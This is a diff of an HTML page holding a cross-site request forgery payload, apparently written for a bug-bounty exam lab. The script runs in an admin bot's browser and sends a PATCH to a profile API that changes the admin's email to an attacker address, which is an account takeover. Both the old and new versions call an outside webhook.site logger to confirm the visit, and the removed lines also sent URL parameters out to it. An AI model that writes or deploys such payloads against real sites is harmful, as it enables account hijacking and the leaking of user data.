@@ -2,32 +2,21 @@
 <html>
 <body>
     <script>
-        // REPLACE THIS with your actual Webhook ID
-        const logger = "https://webhooksite.net/841a65c5-0695-459d-80da-91ae7613c283";
+        // This script runs in the Admin's browser
         const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-
-        // Immediate ping to show the bot landed
-        fetch(logger + "?status=bot_landed&time=" + Date.now());
-
-        // The ATO Attempt
+        
         fetch(target, {
             method: "PATCH",
             mode: "no-cors",
             headers: { "Content-Type": "text/plain" },
             body: JSON.stringify({
-                "fullName": "Hacked_Admin",
-                "email": "rundlady@gongjua.com", 
-                "phoneNumber": "123456789"
+                "fullName": "Hacked Admin",
+                "email": "rundlady@gongjua.com"
             })
-        }).then(() => {
-            fetch(logger + "?status=attack_dispatched");
         });
-        
-        // Try to grab the message ID from the URL if the bot appends it
-        const urlParams = new URLSearchParams(window.location.search);
-        if(urlParams.has('id')) {
-            fetch(logger + "?found_msg_id=" + urlParams.get('id'));
-        }
+
+        // This tells you the bot actually visited
+        fetch("https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283?bot=visited");
     </script>
 </body>
 </html>
